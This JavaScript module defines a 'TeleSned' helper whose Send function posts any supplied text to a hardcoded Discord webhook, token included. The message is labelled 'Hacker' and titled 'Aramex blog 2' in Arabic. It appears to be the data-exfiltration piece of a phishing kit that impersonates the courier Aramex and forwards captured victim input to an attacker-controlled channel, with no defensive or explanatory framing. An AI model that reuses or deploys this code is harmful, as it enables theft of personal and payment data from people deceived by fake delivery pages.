import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330161631921180692/JJ5M44YCXL8J4fGq2ImtfDr-YKmP927_VbvDICN1IInDqKuix_Ik7GQZj1M6v3PF-M6V",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
